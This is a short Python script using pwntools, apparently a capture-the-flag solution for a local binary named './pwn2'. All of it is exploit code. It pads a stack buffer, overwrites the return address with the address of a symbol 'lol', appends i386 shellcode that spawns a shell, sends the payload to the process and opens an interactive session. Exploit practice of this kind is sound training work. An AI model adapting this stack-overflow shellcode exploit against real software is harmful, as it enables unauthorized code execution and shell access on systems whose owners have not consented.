from pwn import *

bufferg = b'a' * 32
basepointerg = b'a' * 4
bpudding = b'a' * 8
address = p32(ELF("./pwn2").symbols["lol"])
code = asm(shellcraft.i386.sh())
msg = bufferg + bpudding + basepointerg + address + basepointerg + code
p = process("./pwn2")
p.sendline(msg)
p.interactive()